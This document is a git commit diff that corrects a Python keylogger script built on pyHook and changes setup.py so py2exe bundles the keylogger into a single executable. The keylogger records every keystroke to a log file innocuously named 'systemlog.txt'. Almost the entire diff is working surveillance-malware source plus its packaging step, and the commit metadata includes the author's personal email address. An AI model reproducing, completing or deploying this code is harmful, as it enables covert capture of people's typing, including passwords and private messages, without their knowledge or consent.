08eae16bee849b24f456f8c86ba3edfe12920e54
Shunto <shu.410.soccer.s@gmail.com>
2017-07-20 11:05:20 +0900

    Added python_keylogger.py

--- python_keylogger.py
+++ python_keylogger.py
@@ -1,13 +1,13 @@
 import pyHook, pythoncom, sys, logging
-file_log = 'C:/systemlog.txt'
+file_log = './log/systemlog.txt'
 
-def OnkeyboardEvent(event):
-    loggin.basicConfig(filename=file_log, level=loggin.DEBUG, format='%(message)s')
+def OnKeyboardEvent(event):
+    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
     chr(event.Ascii)
     logging.log(10, chr(event.Ascii))
     return True
 
-hooks_manager = pyHookManager()
+hooks_manager = pyHook.HookManager()
 hooks_manager.KeyDown = OnKeyboardEvent
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
--- setup.py
+++ setup.py
@@ -1,7 +1,7 @@
 from distutils.core import setup
 import py2exe
 
-setup(console=['python_shell.py'],
+setup(console=['python_keylogger.py'],
       options = {'py2exe':{'bundle_files':1}},
       zipfile = None,
       )
